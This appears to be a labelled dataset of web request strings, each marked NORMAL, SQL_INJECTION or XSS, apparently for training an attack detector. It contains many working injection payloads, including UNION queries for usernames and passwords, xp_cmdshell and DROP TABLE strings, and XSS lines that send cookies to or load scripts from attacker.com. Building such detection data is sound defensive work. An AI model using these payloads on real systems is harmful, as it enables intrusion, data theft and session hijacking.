+filter?category=password123!&sort=desc,0,NORMAL
+item/laptop?ref=homepage,0,NORMAL
+login?user=' HAVING 1=1 --,1,SQL_INJECTION
+item/home?ref=homepage,0,NORMAL
+' OR '1'='1,1,SQL_INJECTION
+browse?tag=python+programming+book,0,NORMAL
+' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+"search?q=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+<marquee onstart=alert(1)>,2,XSS
+filter?category=john_doe&sort=desc,0,NORMAL
+search?q=profile/edit?name=Johnathan,0,NORMAL
+"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+item/profile/edit?name=Johnathan?ref=homepage,0,NORMAL
+item/settings?theme=dark&lang=en?ref=homepage,0,NORMAL
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+search?q=alice.smith@example.com,0,NORMAL
+item?id='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+search?q=ergonomic+chair+mesh,0,NORMAL
+<body onload=alert('XSS')>,2,XSS
+<svg/onload=alert('XSS')>,2,XSS
+api/search?term=blog/post-10-cybersecurity-tips,0,NORMAL
+redirect=<body onload=alert('XSS')>,2,XSS
+index.html,0,NORMAL
+api/v1/users?limit=10&offset=20,0,NORMAL
+"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+query=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+search?q=index.html,0,NORMAL
+1' ORDER BY 2--+,1,SQL_INJECTION
+"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+"""><script>alert(document.domain)</script>",2,XSS
+search?q=' OR 'a'='a,1,SQL_INJECTION
+cart/add?item_id=554&qty=1,0,NORMAL
+' OR 1=1 --,1,SQL_INJECTION
+query=assets/css/main.css&page=1,0,NORMAL
+search?q=dashboard?view=summary,0,NORMAL
+api/search?term=search?q=mechanical+pencil+0.5mm,0,NORMAL
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+<body onload=alert('XSS')>,2,XSS
+privacy-policy,0,NORMAL
+"search?q=""><script>alert(document.domain)</script>",2,XSS
+login?user=1' AND SLEEP(10)--,1,SQL_INJECTION
+<svg onload=alert(1)>,2,XSS
+item/privacy-policy?ref=homepage,0,NORMAL
+python programming book,0,NORMAL
+""" OR ""1""=""1",1,SQL_INJECTION
+password123!,0,NORMAL
+query=<body onload=alert('XSS')>,2,XSS
+"item?id="" OR ""1""=""1",1,SQL_INJECTION
+john_doe,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+query=alice.smith@example.com&page=1,0,NORMAL
+query=dashboard?view=summary&page=1,0,NORMAL
+search?q=<svg/onload=alert('XSS')>,2,XSS
+query=usb+c+cable+2m&page=1,0,NORMAL
+'; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+redirect=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+filter?category=alice.smith@example.com&sort=desc,0,NORMAL
+api/search?term=faq/shipping-times,0,NORMAL
+filter?category=checkout?shipping=standard&promo=WELCOME10&sort=desc,0,NORMAL
+query=download/specs-datasheet.pdf&page=1,0,NORMAL
+query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"<object data=""javascript:alert(1)"">",2,XSS
+mechanical keyboard,0,NORMAL
+filter?category=admin_user_2024&sort=desc,0,NORMAL
+order/status?tracking=FEDEX-889922,0,NORMAL
+search?q=best+headphones+under+100,0,NORMAL
+query=<img src=x onerror=alert('XSS')>,2,XSS
+<img src=x onerror=alert('XSS')>,2,XSS
+contact,0,NORMAL
+search?q='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+cart/add?item_id=554&qty=1,0,NORMAL
+item/best+headphones+under+100?ref=homepage,0,NORMAL
+"search?q=""><script>alert(document.domain)</script>",2,XSS
+about-us,0,NORMAL
+alice.smith@example.com,0,NORMAL
+filter?category=about-us&sort=desc,0,NORMAL
+search?q=) or ('1'='1,1,SQL_INJECTION
+api/search?term=api/v1/users?limit=10&offset=20,0,NORMAL
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+redirect=<body onload=alert('XSS')>,2,XSS
+comment=<img src=x onerror=alert('XSS')>,2,XSS
+filter?category=laptop&sort=desc,0,NORMAL
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+comment=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+filter?category=gaming+monitor&sort=desc,0,NORMAL
+search?q=search?q=mechanical+pencil+0.5mm,0,NORMAL
+search?q=<details open ontoggle=alert(1)>,2,XSS
+"comment=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+search?q=dashboard?view=summary,0,NORMAL
+"search?q=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+<marquee onstart=alert(1)>,2,XSS
+search?q=assets/js/bundle.min.js,0,NORMAL
+blog/post-10-cybersecurity-tips,0,NORMAL
+search?q=gaming+monitor,0,NORMAL
+search?q=api/v1/users?limit=10&offset=20,0,NORMAL
+"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+faq/shipping-times,0,NORMAL
+'; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+api/search?term=images/banner-sale.jpg,0,NORMAL
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+browse?tag=index.html,0,NORMAL
+' or 1=1/*,1,SQL_INJECTION
+browse?tag=reviews?rating=5&verified=true,0,NORMAL
+query=<script>alert('XSS')</script>,2,XSS
+search?q=password123!,0,NORMAL
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+account/security/2fa-setup,0,NORMAL
+search?q=admin' #,1,SQL_INJECTION
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+1' AND SLEEP(10)--,1,SQL_INJECTION
+api/search?term=cotton+t-shirt+blue,0,NORMAL
+1; DROP TABLE users--,1,SQL_INJECTION
+<input autofocus onfocus=alert(1)>,2,XSS
+catalog?page=2&sort=price_asc,0,NORMAL
+query=shoes+for+running&page=1,0,NORMAL
+query=blog/post-10-cybersecurity-tips&page=1,0,NORMAL
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+filter?category=checkout?shipping=standard&promo=WELCOME10&sort=desc,0,NORMAL
+1' AND SLEEP(10)--,1,SQL_INJECTION
+python programming book,0,NORMAL
+newsletter/subscribe?email=user@test.org,0,NORMAL
+filter?category=help/return-policy&sort=desc,0,NORMAL
+item/profile/edit?name=Johnathan?ref=homepage,0,NORMAL
+filter?category=checkout?shipping=standard&promo=WELCOME10&sort=desc,0,NORMAL
+api/search?term=terms-and-conditions,0,NORMAL
+redirect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+search?q=faq/shipping-times,0,NORMAL
+alice.smith@example.com,0,NORMAL
+filter=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+filter=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+api/search?term=search?q=ergonomic+chair+mesh,0,NORMAL
+product?id=102&category=electronics,0,NORMAL
+wireless mouse,0,NORMAL
+login?user=' or 1=1/*,1,SQL_INJECTION
+api/search?term=search?q=ergonomic+chair+mesh,0,NORMAL
+item/index.html?ref=homepage,0,NORMAL
+api/search?term=cart/add?item_id=554&qty=1,0,NORMAL
+admin' #,1,SQL_INJECTION
+search?q=profile/edit?name=Johnathan,0,NORMAL
+password123!,0,NORMAL
+<input autofocus onfocus=alert(1)>,2,XSS
+filter?category=gaming+monitor&sort=desc,0,NORMAL
+apple macbook pro m2,0,NORMAL
+item?id='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+<marquee onstart=alert(1)>,2,XSS
+mechanical keyboard,0,NORMAL
+') or ('1'='1'--,1,SQL_INJECTION
+<marquee onstart=alert(1)>,2,XSS
+api/search?term=john_doe,0,NORMAL
+<marquee onstart=alert(1)>,2,XSS
+search?q=' OR 'a'='a,1,SQL_INJECTION
+search?q=admin_user_2024,0,NORMAL
+<select autofocus onfocus=alert(1)>,2,XSS
+wireless mouse,0,NORMAL
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+search?q=order/status?tracking=FEDEX-889922,0,NORMAL
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+wireless mouse,0,NORMAL
+filter?category=gaming+monitor&sort=desc,0,NORMAL
+reviews?rating=5&verified=true,0,NORMAL
+<svg/onload=alert('XSS')>,2,XSS
+"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+"search?q=<video><source onerror=""javascript:alert(1)"">",2,XSS
+api/search?term=cotton+t-shirt+blue,0,NORMAL
+api/search?term=apple+macbook+pro+m2,0,NORMAL
+reviews?rating=5&verified=true,0,NORMAL
+redirect='><script>alert('PWNED')</script>,2,XSS
+order/status?tracking=FEDEX-889922,0,NORMAL
+api/search?term=apple+macbook+pro+m2,0,NORMAL
+api/search?term=index.html,0,NORMAL
+item/terms-and-conditions?ref=homepage,0,NORMAL
+' OR 'a'='a,1,SQL_INJECTION
+filter?category=faq/shipping-times&sort=desc,0,NORMAL
+item/products/audio/bluetooth-speakers?ref=homepage,0,NORMAL
+search?q='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+"query=""><script>alert(document.domain)</script>",2,XSS
+search?q=' HAVING 1=1 --,1,SQL_INJECTION
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+filter?category=admin_user_2024&sort=desc,0,NORMAL
+browse?tag=help/return-policy,0,NORMAL
+api/search?term=product?id=102&category=electronics,0,NORMAL
+' OR 'a'='a,1,SQL_INJECTION
+search?q=help/return-policy,0,NORMAL
+item/account/security/2fa-setup?ref=homepage,0,NORMAL
+query=assets/css/main.css&page=1,0,NORMAL
+<select autofocus onfocus=alert(1)>,2,XSS
+python programming book,0,NORMAL
+"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+settings?theme=dark&lang=en,0,NORMAL
+browse?tag=products/audio/bluetooth-speakers,0,NORMAL
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+"search?q=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+query=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+"comment=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+browse?tag=cart/add?item_id=554&qty=1,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+search?q=alice.smith@example.com,0,NORMAL
+comment=<script>alert('XSS')</script>,2,XSS
+search?q=search?q=mechanical+pencil+0.5mm,0,NORMAL
+blog/post-10-cybersecurity-tips,0,NORMAL
+login?user=) or ('1'='1,1,SQL_INJECTION
+redirect=<svg onload=alert(1)>,2,XSS
+search?q=<script>alert('XSS')</script>,2,XSS
+filter?category=checkout?shipping=standard&promo=WELCOME10&sort=desc,0,NORMAL
+search?q=<input autofocus onfocus=alert(1)>,2,XSS
+api/search?term=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+<select autofocus onfocus=alert(1)>,2,XSS
+gaming monitor,0,NORMAL
+api/search?term=api/v1/users?limit=10&offset=20,0,NORMAL
+filter?category=apple+macbook+pro+m2&sort=desc,0,NORMAL
+browse?tag=wireless+mouse,0,NORMAL
+item?id=' OR '1'='1,1,SQL_INJECTION
+redirect=<details open ontoggle=alert(1)>,2,XSS
+"redirect=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+shoes for running,0,NORMAL
+order/status?tracking=FEDEX-889922,0,NORMAL
+query=<details open ontoggle=alert(1)>,2,XSS
+api/search?term=index.html,0,NORMAL
+images/banner-sale.jpg,0,NORMAL
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+filter?category=home&sort=desc,0,NORMAL
+blog/post-10-cybersecurity-tips,0,NORMAL
+settings?theme=dark&lang=en,0,NORMAL
+item/checkout?shipping=standard&promo=WELCOME10?ref=homepage,0,NORMAL
+"login?user=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+search?q=search?q=ergonomic+chair+mesh,0,NORMAL
+"""><script>alert(document.domain)</script>",2,XSS
+api/search?term=cart/checkout?step=billing,0,NORMAL
+wireless mouse,0,NORMAL
+view_order?order_id=983214,0,NORMAL
+search?q=cotton+t-shirt+blue,0,NORMAL
+query=cotton+t-shirt+blue&page=1,0,NORMAL
+faq/shipping-times,0,NORMAL
+"search?q=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+') or ('1'='1'--,1,SQL_INJECTION
+comment=<marquee onstart=alert(1)>,2,XSS
+home,0,NORMAL
+<svg/onload=alert('XSS')>,2,XSS
+filter=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+admin'/*,1,SQL_INJECTION
+api/search?term=view_order?order_id=983214,0,NORMAL
+item/reviews?rating=5&verified=true?ref=homepage,0,NORMAL
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+search?q=shoes+for+running,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+search?q=admin' #,1,SQL_INJECTION
+item/admin_user_2024?ref=homepage,0,NORMAL
+filter=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+query=search?q=ergonomic+chair+mesh&page=1,0,NORMAL
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+assets/js/bundle.min.js,0,NORMAL
+query=mechanical+keyboard&page=1,0,NORMAL
+item/best+headphones+under+100?ref=homepage,0,NORMAL
+""" OR ""1""=""1",1,SQL_INJECTION
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+1; DROP TABLE users--,1,SQL_INJECTION
+filter?category=settings?theme=dark&lang=en&sort=desc,0,NORMAL
+"query=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+browse?tag=view_order?order_id=983214,0,NORMAL
+<body onload=alert('XSS')>,2,XSS
+api/search?term=order/status?tracking=FEDEX-889922,0,NORMAL
+profile/edit?name=Johnathan,0,NORMAL
+SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+filter?category=privacy-policy&sort=desc,0,NORMAL
+dashboard?view=summary,0,NORMAL
+"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+apple macbook pro m2,0,NORMAL
+order/status?tracking=FEDEX-889922,0,NORMAL
+api/search?term=index.html,0,NORMAL
+query=apple+macbook+pro+m2&page=1,0,NORMAL
+<select autofocus onfocus=alert(1)>,2,XSS
+api/search?term=order/status?tracking=FEDEX-889922,0,NORMAL
+browse?tag=catalog?page=2&sort=price_asc,0,NORMAL
+browse?tag=wireless+mouse,0,NORMAL
+laptop,0,NORMAL
+faq/shipping-times,0,NORMAL
+<img src=x onerror=alert('XSS')>,2,XSS
+'><script>alert('PWNED')</script>,2,XSS
+browse?tag=best+headphones+under+100,0,NORMAL
+search?q=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+browse?tag=product?id=102&category=electronics,0,NORMAL
+"search?q=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+browse?tag=about-us,0,NORMAL
+query=<body onload=alert('XSS')>,2,XSS
+"search?q=""><script>alert(document.domain)</script>",2,XSS
+"item?id=' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+item/products/audio/bluetooth-speakers?ref=homepage,0,NORMAL
+search?q=spring+sale+discount,0,NORMAL
+item/terms-and-conditions?ref=homepage,0,NORMAL
+query=alice.smith@example.com&page=1,0,NORMAL
+"item?id=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+item/search?q=4k+oled+television+lg?ref=homepage,0,NORMAL
+') or ('1'='1'--,1,SQL_INJECTION
+redirect=<script>alert(1)</script>,2,XSS
+filter?category=terms-and-conditions&sort=desc,0,NORMAL
+mechanical keyboard,0,NORMAL
+comment=<select autofocus onfocus=alert(1)>,2,XSS
+faq/shipping-times,0,NORMAL
+"item?id=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+login?user=' or 1=1/*,1,SQL_INJECTION
+admin_user_2024,0,NORMAL
+login?user=1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
+search?q=ergonomic+chair+mesh,0,NORMAL
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+item?id='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+' OR '1'='1,1,SQL_INJECTION
+comment=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+catalog?page=2&sort=price_asc,0,NORMAL
+admin' --,1,SQL_INJECTION
+<select autofocus onfocus=alert(1)>,2,XSS
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+query=wireless+mouse&page=1,0,NORMAL
+item/search?q=mechanical+pencil+0.5mm?ref=homepage,0,NORMAL
+1' ORDER BY 1--+,1,SQL_INJECTION
+python programming book,0,NORMAL
+mechanical keyboard,0,NORMAL
+python programming book,0,NORMAL
+filter=' OR '1'='1,1,SQL_INJECTION
+browse?tag=home,0,NORMAL
+search?q=usb+c+cable+2m,0,NORMAL
+home,0,NORMAL
+' OR 'a'='a,1,SQL_INJECTION
+query=alice.smith@example.com&page=1,0,NORMAL
+comment=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+search?q=<body onload=alert('XSS')>,2,XSS
+item?id=' or 1=1/*,1,SQL_INJECTION
+api/search?term=john_doe,0,NORMAL
+search?q=mechanical+pencil+0.5mm,0,NORMAL
+search?q=' OR 'a'='a,1,SQL_INJECTION
+mechanical keyboard,0,NORMAL
+query=assets/css/main.css&page=1,0,NORMAL
+api/search?term=search?q=mechanical+pencil+0.5mm,0,NORMAL
+browse?tag=mechanical+keyboard,0,NORMAL
+item?id=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+browse?tag=assets/js/bundle.min.js,0,NORMAL
+"filter=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+apple macbook pro m2,0,NORMAL
+filter=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+<marquee onstart=alert(1)>,2,XSS
+item?id=1' ORDER BY 2--+,1,SQL_INJECTION
+privacy-policy,0,NORMAL
+api/v1/users?limit=10&offset=20,0,NORMAL
+"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+filter='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+cart/add?item_id=554&qty=1,0,NORMAL
+"redirect=<object data=""javascript:alert(1)"">",2,XSS
+' OR '1'='1,1,SQL_INJECTION
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+search?q=gaming+monitor,0,NORMAL
+item?id=' OR 'a'='a,1,SQL_INJECTION
+browse?tag=search?q=mechanical+pencil+0.5mm,0,NORMAL
+item/view_order?order_id=983214?ref=homepage,0,NORMAL
+filter?category=best+headphones+under+100&sort=desc,0,NORMAL
+search?q=spring+sale+discount,0,NORMAL
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+item/admin_user_2024?ref=homepage,0,NORMAL
+item?id=1' AND SLEEP(10)--,1,SQL_INJECTION
+query=search?q=ergonomic+chair+mesh&page=1,0,NORMAL
+query=<body onload=alert('XSS')>,2,XSS
+1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
+john_doe,0,NORMAL
+mechanical keyboard,0,NORMAL
+query=<marquee onstart=alert(1)>,2,XSS
+help/return-policy,0,NORMAL
+item/profile/edit?name=Johnathan?ref=homepage,0,NORMAL
+python programming book,0,NORMAL
+search?q=<input autofocus onfocus=alert(1)>,2,XSS
+search?q='><script>alert('PWNED')</script>,2,XSS
+<script>alert('XSS')</script>,2,XSS
+filter=' or 1=1/*,1,SQL_INJECTION
+browse?tag=terms-and-conditions,0,NORMAL
+help/return-policy,0,NORMAL
+search?q=<input autofocus onfocus=alert(1)>,2,XSS
+browse?tag=account/security/2fa-setup,0,NORMAL
+filter?category=account/security/2fa-setup&sort=desc,0,NORMAL
+browse?tag=help/return-policy,0,NORMAL
+""" OR ""1""=""1",1,SQL_INJECTION
+search?q=1; DROP TABLE users--,1,SQL_INJECTION
+item/profile/edit?name=Johnathan?ref=homepage,0,NORMAL
+item/john_doe?ref=homepage,0,NORMAL
+' OR 'a'='a,1,SQL_INJECTION
+search?q=<body onload=alert('XSS')>,2,XSS
+query=<svg/onload=alert('XSS')>,2,XSS
+') or ('1'='1'--,1,SQL_INJECTION
+filter?category=products/audio/bluetooth-speakers&sort=desc,0,NORMAL
+"search?q=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+filter?category=mechanical+keyboard&sort=desc,0,NORMAL
+query=<svg onload=alert(1)>,2,XSS
+dashboard?view=summary,0,NORMAL
+shoes for running,0,NORMAL
+contact,0,NORMAL
+<marquee onstart=alert(1)>,2,XSS
+query=password123!&page=1,0,NORMAL
+dashboard?view=summary,0,NORMAL
+search?q=ergonomic+chair+mesh,0,NORMAL
+search?q=python+programming+book,0,NORMAL
+search?q='><script>alert('PWNED')</script>,2,XSS
+index.html,0,NORMAL
+comment=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+cotton t-shirt blue,0,NORMAL
+1' ORDER BY 3--+,1,SQL_INJECTION
+' or 1=1#,1,SQL_INJECTION
+<img src=x onerror=alert('XSS')>,2,XSS
+browse?tag=profile/edit?name=Johnathan,0,NORMAL
+login?user=' OR '1'='1,1,SQL_INJECTION
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+login?user=1' ORDER BY 1--+,1,SQL_INJECTION
+assets/js/bundle.min.js,0,NORMAL
+shoes for running,0,NORMAL
+"<object data=""javascript:alert(1)"">",2,XSS
+admin' #,1,SQL_INJECTION
+' or 1=1/*,1,SQL_INJECTION
+filter?category=terms-and-conditions&sort=desc,0,NORMAL
+cotton t-shirt blue,0,NORMAL
+shoes for running,0,NORMAL
+"search?q=""><script>alert(document.domain)</script>",2,XSS
+item/password123!?ref=homepage,0,NORMAL
+%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+blog/post-10-cybersecurity-tips,0,NORMAL
+query=products/audio/bluetooth-speakers&page=1,0,NORMAL
+' or 1=1#,1,SQL_INJECTION
+'><script>alert('PWNED')</script>,2,XSS
+wireless mouse,0,NORMAL
+images/banner-sale.jpg,0,NORMAL
+api/search?term=privacy-policy,0,NORMAL
+query=faq/shipping-times&page=1,0,NORMAL
+"""><script>alert(document.domain)</script>",2,XSS
+query=assets/js/bundle.min.js&page=1,0,NORMAL
+api/search?term=products/audio/bluetooth-speakers,0,NORMAL
+item?id=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+browse?tag=mechanical+keyboard,0,NORMAL
+query=gaming+monitor&page=1,0,NORMAL
+comment=<select autofocus onfocus=alert(1)>,2,XSS
+item/api/v1/users?limit=10&offset=20?ref=homepage,0,NORMAL
+<script>alert('XSS')</script>,2,XSS
+comment=<select autofocus onfocus=alert(1)>,2,XSS
+query=products/audio/bluetooth-speakers&page=1,0,NORMAL
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+<script>alert(1)</script>,2,XSS
+search?q=' or 1=1/*,1,SQL_INJECTION
+item/wireless+mouse?ref=homepage,0,NORMAL
+"search?q=1' UNION SELECT null, null, null--",1,SQL_INJECTION
+filter=' OR 1=1 --,1,SQL_INJECTION
+search?q=<svg/onload=alert('XSS')>,2,XSS
+filter?category=about-us&sort=desc,0,NORMAL
+search?q=alice.smith@example.com,0,NORMAL
+login?user=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+1' ORDER BY 1--+,1,SQL_INJECTION
+' or 1=1#,1,SQL_INJECTION
+login?user=' OR 'a'='a,1,SQL_INJECTION
+login?user=%27%20OR%201%3D1%20--,1,SQL_INJECTION
+cotton t-shirt blue,0,NORMAL
+search?q=faq/shipping-times,0,NORMAL
+search?q=search?q=4k+oled+television+lg,0,NORMAL
+<img src=x onerror=alert('XSS')>,2,XSS
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+settings?theme=dark&lang=en,0,NORMAL
+' OR 1=1 --,1,SQL_INJECTION
+search?q=' or 1=1#,1,SQL_INJECTION
+apple macbook pro m2,0,NORMAL
+john_doe,0,NORMAL
+query=checkout?shipping=standard&promo=WELCOME10&page=1,0,NORMAL
+"query=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+item/download/specs-datasheet.pdf?ref=homepage,0,NORMAL
+login?user=) or ('1'='1,1,SQL_INJECTION
+' HAVING 1=1 --,1,SQL_INJECTION
+profile/edit?name=Johnathan,0,NORMAL
+<svg/onload=alert('XSS')>,2,XSS
+filter?category=dashboard?view=summary&sort=desc,0,NORMAL
+redirect=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+1; DROP TABLE users--,1,SQL_INJECTION
+blog/post-10-cybersecurity-tips,0,NORMAL
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+query=contact&page=1,0,NORMAL
+query=home&page=1,0,NORMAL
+catalog?page=2&sort=price_asc,0,NORMAL
+item?id=admin' --,1,SQL_INJECTION
+password123!,0,NORMAL
+filter?category=home&sort=desc,0,NORMAL
+assets/css/main.css,0,NORMAL
+query=help/return-policy&page=1,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+admin'/*,1,SQL_INJECTION
+query=laptop&page=1,0,NORMAL
+' or 1=1/*,1,SQL_INJECTION
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+browse?tag=privacy-policy,0,NORMAL
+query=<script>alert(1)</script>,2,XSS
+query=<img src=x onerror=alert('XSS')>,2,XSS
+best headphones under 100,0,NORMAL
+laptop,0,NORMAL
+browse?tag=index.html,0,NORMAL
+blog/post-10-cybersecurity-tips,0,NORMAL
+redirect=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+filter?category=reviews?rating=5&verified=true&sort=desc,0,NORMAL
+comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+search?q=1' AND SLEEP(10)--,1,SQL_INJECTION
+filter?category=password123!&sort=desc,0,NORMAL
+search?q=gaming+monitor,0,NORMAL
+' OR 1=1 --,1,SQL_INJECTION
+query=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+<svg/onload=alert('XSS')>,2,XSS
+<img src=x onerror=alert('XSS')>,2,XSS
+<script>alert(1)</script>,2,XSS
+api/search?term=usb+c+cable+2m,0,NORMAL
+'; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+search?q=view_order?order_id=983214,0,NORMAL
+comment=<svg/onload=alert('XSS')>,2,XSS
+) or ('1'='1,1,SQL_INJECTION
+' or 1=1/*,1,SQL_INJECTION
+item/help/return-policy?ref=homepage,0,NORMAL
+settings?theme=dark&lang=en,0,NORMAL
+search?q=<select autofocus onfocus=alert(1)>,2,XSS
+gaming monitor,0,NORMAL
+search?q=<body onload=alert('XSS')>,2,XSS
+item?id=' OR 'a'='a,1,SQL_INJECTION
+query=<input autofocus onfocus=alert(1)>,2,XSS
+query=home&page=1,0,NORMAL
+order/status?tracking=FEDEX-889922,0,NORMAL
+search?q=download/specs-datasheet.pdf,0,NORMAL
+about-us,0,NORMAL
+filter?category=download/specs-datasheet.pdf&sort=desc,0,NORMAL
+search?q=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+api/search?term=products/audio/bluetooth-speakers,0,NORMAL
+browse?tag=mechanical+keyboard,0,NORMAL
